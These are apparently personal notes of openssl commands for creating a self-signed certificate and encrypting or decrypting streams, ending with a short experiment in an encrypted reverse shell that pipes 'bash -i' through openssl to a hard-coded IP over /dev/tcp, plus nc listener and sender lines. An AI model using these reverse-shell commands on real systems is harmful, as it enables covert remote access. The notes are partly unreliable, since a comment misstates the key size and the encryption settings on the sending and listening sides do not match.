# create a self-signed cert
openssl req -x509 -days 365 -out a.crt -newkey rsa:4096 -nodes -keyout a.key

# `req` initiate a new certificate signing request
# `-x509` output self-signed cert instead of a cert request
# `-days 365` define cert expiry
# `-out a.crt` write cert to given file
# `-newkey` generate a new private key as well
# `-nodes` "No DES" meaning do not use/prompt for private key password
# `rsa:4096` use RSA with a 2048-bit key len
# `-keyout a.key` write key to given file

# ...and look how simple PEM format is:

cat a.key a.crt > a.pem

# the output files are just human-readable ASCII text





# experimenting with a one-liner to encrypt/decrypt streams
echo hello | openssl enc -aes-256-cbc -md sha512 -a -pbkdf2 -iter 100000 -salt -pass pass:Aej3ohthieth7ieS
echo U2FsdGVkX18h31kB5hiRxDlybVhAwBDuiUNI4F65R/c= | openssl enc -aes-256-cbc -md sha512 -a -d -pbkdf2 -iter 100000 -salt -pass pass:Aej3ohthieth7ieS

echo hello | openssl enc -aes-256-cbc -K 14FA787F7308659045EC8027F9A03B1A7436A5421B750165B22E10F5B0F4EE1F -iv BBD7F4A118DB0C86C2FD0A29D9AE3DE5  | openssl enc -aes-256-cbc -K 14FA787F7308659045EC8027F9A03B1A7436A5421B750165B22E10F5B0F4EE1F -iv BBD7F4A118DB0C86C2FD0A29D9AE3DE5

bash -i | openssl enc -aes-256-cbc -K 14FA787F7308659045EC8027F9A03B1A7436A5421B750165B22E10F5B0F4EE1F -iv BBD7F4A118DB0C86C2FD0A29D9AE3DE5 0>&1 >&/dev/tcp/192.168.119.198/80 &

sudo nc -vlp 80 -ns 192.168.119.198 | openssl enc -aes-256-cbc -md sha512 -a -pbkdf2 -iter 100000 -salt -pass pass:Aej3ohthieth7ieS -d
echo hello | openssl enc -aes-256-cbc -iter 5 -pass pass:Aej3ohthieth7ieS

cat | openssl enc -aes-256-cbc -md sha512 -a -pbkdf2 -iter 100000 -salt -pass pass:Aej3ohthieth7ieS | nc -v 192.168.119.198 80

